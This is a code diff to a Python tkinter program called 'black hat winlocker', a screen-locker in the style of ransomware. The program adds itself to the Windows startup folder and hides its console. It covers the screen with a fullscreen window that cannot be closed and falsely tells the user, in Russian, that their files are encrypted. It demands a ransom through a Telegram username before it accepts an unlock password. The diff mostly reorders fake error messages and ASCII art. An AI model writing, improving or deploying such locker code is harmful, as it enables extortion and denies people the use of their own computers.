@@ -24,7 +24,6 @@ from tkinter import messagebox
 import shutil
 import sys
 import ctypes
-import time
 
 def add_to_startup_folder():
     script_path = os.path.abspath(sys.argv[0])
@@ -38,46 +37,11 @@ def add_to_startup_folder():
         shutil.copy2(script_path, startup_folder)
     except Exception as e:
          print("ошибка автозагрузки!")
-print(r"""
-error: ox0374582
-error: 0x34769432
-error: 0x017238""")
-time.sleep(1)
-print(r"""error: 0x675825637
-error: 0x63836426""")
-time.sleep(0.5)
-print('Ecryptor started')
-time.sleep(1)
-os.system('cls' if os.name == 'nt' else 'clear')
-print(r"""
-            ;::::; 
-           ;::::; :; 
-         ;:::::'   :; 
-        ;:::::;     ;. 
-       ,:::::'       ;           OOO\ 
-       ::::::;       ;          OOOOO\ 
-       ;:::::;       ;         OOOOOOOO 
-      ,;::::::;     ;'         / OOOOOOO 
-    ;:::::::::`. ,,,;.        /  / DOOOOOO 
-  .';:::::::::::::::::;,     /  /     DOOOO 
-,::::::;::::::;;;;::::;,   /  /        DOOO 
-;`::::::`'::::::;;;::::: ,#/  /          DOOO 
-:`:::::::`;::::::;;::: ;::#  /            DOOO 
-::`:::::::`;:::::::: ;::::# /              DOO 
-`:`:::::::`;:::::: ;::::::#/               DOO 
-:::`:::::::`;; ;:::::::::##                OO 
-::::`:::::::`;::::::::;:::#                OO 
-`:::::`::::::::::::;'`:;::#                O 
-  `:::::`::::::::;' /  / `:# 
-   ::::::`:::::;'  /  /   `#
-      """)
-
-time.sleep(0.5)
 
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
 def check_input(event=None):
-    user_input = entry.get().strip() 
+    user_input = entry1.get().strip() 
     if user_input == f"{parol}":  
         messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
         root.destroy() 
@@ -86,55 +50,21 @@ def check_input(event=None):
 
 root = tk.Tk()
 root.title("black hat winlocker")
-
-
 root.attributes("-fullscreen", True)
 root.configure(bg="blue")
-
 root.attributes("-topmost", True)
-
 root.protocol("WM_DELETE_WINDOW", lambda: None)
 
-label = tk.Label(root, text=f"ваш виндовс заблокирован {name}", foreground="white", background="blue", font=("Arial", 35))
-label.pack(pady=20)
+entry1 = tk.Entry(root, show="*", width=30, font=("Arial", 25))
+
+entry1.bind("<Return>", check_input)
 
 
-entry = tk.Entry(root, show="*", width=30, font=("Arial", 25))
-entry.pack(pady=10)
+button1 = tk.Button(root, text="подтвердить", command=check_input)
 
-
-entry.bind("<Return>", check_input)
-
-
-button = tk.Button(root, text="подтвердить", command=check_input)
-button.pack(pady=5)
-
-label = tk.Label(
+label4 = tk.Label(
     root,
-    text="вас заметили",
-    foreground="white",        
-    background="blue",  
-    font=("Arial", 70),
-    padx=10,
-    pady=10
-)
-label.pack()
-
-
-label = tk.Label(
-    root,
-    text="👁",
-    foreground="white",        
-    background="blue",  
-    font=("Arial", 70),
-    padx=10,
-    pady=10
-)
-label.pack()
-
-label = tk.Label(
-    root,
-    text=r"""
+    text="""
     упс! вы подверглись хакерской атаке и ваши файлы были зашифрованы!
     пока ваш компьютер находится в этом состоянии вы ничего не сможете сделать.
     Любая попытка обхода вируса карается повторным запуском вируса!""",
@@ -144,11 +74,10 @@ label = tk.Label(
     padx=10,
     pady=10
 )
-label.pack()
 
-label = tk.Label(
+label5 = tk.Label(
     root,
-    text=rf"""
+    text=f"""
     для откупа вы можете связатся с нами
     писать нужно в социальную сеть telegram
     юзернейм автора @{otkup}""",
@@ -159,7 +88,63 @@ label = tk.Label(
     pady=10
 )
 
-label.pack()
+smert2 = tk.Label(root, text="""
+error: ox0374582
+error: 0x34769432
+error: 0x017238
+error: 0x675825637
+error: 0x63836426
+Ecryptor started!""", foreground="white", background="blue", font=("Arial", 20))
+
+smert1 = tk.Label(root, text="""
+              a          a
+             aaa        aaa
+            aaaaaaaaaaaaaaaa
+           aaaaaaaaaaaaaaaaaa
+          aaaaafaaaaaaafaaaaaa
+          aaaaaaaaaaaaaaaaaaaa
+           aaaaaaaaaaaaaaaaaa
+            aaaaaaa  aaaaaaa
+             aaaaaaaaaaaaaa
+  a         aaaaaaaaaaaaaaaa
+ aaa       aaaaaaaaaaaaaaaaaa
+ aaa      aaaaaaaaaaaaaaaaaaaa
+ aaa     aaaaaaaaaaaaaaaaaaaaaa
+ aaa    aaaaaaaaaaaaaaaaaaaaaaaa
+  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
+  aaa   aaaaaaaaaaaaaaaaaaaaaaaa
+  aaa    aaaaaaaaaaaaaaaaaaaaaa
+   aaa    aaaaaaaaaaaaaaaaaaaa
+    aaaaaaaaaaaaaaaaaaaaaaaaaa
+     aaaaaaaaaaaaaaaaaaaaaaaaa
+""", foreground="white", background="blue", font=("Arial", 20))
+
+label1 = tk.Label(root, text=f"ваш виндовс заблокирован {name}", foreground="white", background="blue", font=("Arial", 35))
+
+def show_smert1():
+    smert2.place(x=0, y=0)
+    root.after(2000, hide_smert1)
+
+def hide_smert1():
+    smert2.place_forget()
+    show_smert2()
+
+def show_smert2():
+    smert1.place(x=0, y=0)
+    root.after(2000, hide_smert2)
+
+def hide_smert2():
+    smert1.place_forget()
+    show_label1()
+
+def show_label1():
+    label1.pack()
+    entry1.pack()
+    button1.pack()
+    label4.pack()
+    label5.pack()
+
 if __name__ == "__main__":
     add_to_startup_folder()
+    show_smert1()
     root.mainloop()
